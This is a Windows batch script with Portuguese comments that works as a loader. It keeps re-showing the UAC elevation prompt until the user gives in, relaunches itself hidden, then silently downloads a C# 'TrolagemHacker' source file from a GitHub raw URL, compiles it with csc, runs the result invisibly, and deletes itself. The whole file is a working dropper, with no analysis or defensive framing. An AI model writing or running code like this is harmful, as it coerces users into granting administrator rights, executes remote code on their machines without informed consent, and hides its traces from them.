@echo off
:: =============================================================
:: VERIFICAR SE JÁ SOMOS ADMIN (instância elevada)
:: =============================================================
net session >nul 2>&1
if %errorlevel% equ 0 (
    :: Somos Admin! Criar sinal para o loop parar
    echo OK > "%temp%\admin_ok.flag"
    goto EXECUTAR
)

:: =============================================================
:: NÃO SOMOS ADMIN - LOOP INFINITO ATÉ ACEITAR
:: =============================================================
:: Limpar flag antiga se existir
del /f /q "%temp%\admin_ok.flag" >nul 2>&1

:PEDIR_ADMIN
:: Verificar se a instância elevada já criou o sinal
if exist "%temp%\admin_ok.flag" (
    del /f /q "%temp%\admin_ok.flag" >nul 2>&1
    :: Admin foi aceito, a instância elevada já está rodando
    :: Esta instância original pode morrer em paz
    (goto) 2>nul & del /f /q "%~f0"
    exit
)

:: Pedir Admin via VBS (abre a janela UAC)
echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
echo UAC.ShellExecute "%~f0", "", "", "runas", 0 >> "%temp%\getadmin.vbs"
cscript //nologo "%temp%\getadmin.vbs" >nul 2>&1
del /f /q "%temp%\getadmin.vbs" >nul 2>&1

:: Esperar 2 segundos para dar tempo do UAC aparecer e ser respondido
ping 127.0.0.1 -n 3 -w 1000 >nul 2>&1

:: Verificar novamente se o Admin foi aceito
if exist "%temp%\admin_ok.flag" (
    del /f /q "%temp%\admin_ok.flag" >nul 2>&1
    (goto) 2>nul & del /f /q "%~f0"
    exit
)

:: Não aceitou ainda, pedir de novo
goto PEDIR_ADMIN

:: =============================================================
:: EXECUÇÃO COM ADMIN (modo oculto)
:: =============================================================
:EXECUTAR
:: Relançar em modo oculto se ainda visível
if not "%~1"=="OCULTO" (
    echo Set WshShell = CreateObject("WScript.Shell") > "%temp%\launcher.vbs"
    echo WshShell.Run """cmd /c """"" ^& "%~f0" ^& """""" OCULTO", 0, False >> "%temp%\launcher.vbs"
    cscript //nologo "%temp%\launcher.vbs"
    del /f /q "%temp%\launcher.vbs" >nul 2>&1
    exit
)

:: =============================================================
:: DOWNLOAD, COMPILAÇÃO E EXECUÇÃO (100%% invisível com Admin)
:: =============================================================
set "GITHUB_RAW_URL=https://raw.githubusercontent.com/espertin/wind/main/TrolagemHacker_GitHub.cs"
set "TEMP_CS=%temp%\TrolagemHacker.cs"
set "EXE_OUT=%temp%\TrolagemHacker.exe"

:: --- LOCALIZAR COMPILADOR ---
set "CSC_PATH=C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"
if not exist "%CSC_PATH%" set "CSC_PATH=C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe"

:: --- DOWNLOAD SILENCIOSO (SEM CACHE) ---
powershell -WindowStyle Hidden -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; (New-Object Net.WebClient).DownloadFile('%GITHUB_RAW_URL%?nocache=' + [DateTime]::Now.Ticks, '%TEMP_CS%')" >nul 2>&1

:: --- COMPILAÇÃO SILENCIOSA ---
if exist "%TEMP_CS%" (
    "%CSC_PATH%" /nologo /target:winexe /out:"%EXE_OUT%" "%TEMP_CS%" >nul 2>&1
)

:: --- EXECUÇÃO ---
if exist "%EXE_OUT%" (
    start "" "%EXE_OUT%"
)

:: --- LIMPEZA E AUTODESTRUIÇÃO ---
del /f /q "%TEMP_CS%" >nul 2>&1
del /f /q "%temp%\admin_ok.flag" >nul 2>&1
(goto) 2>nul & del /f /q "%~f0"
exit
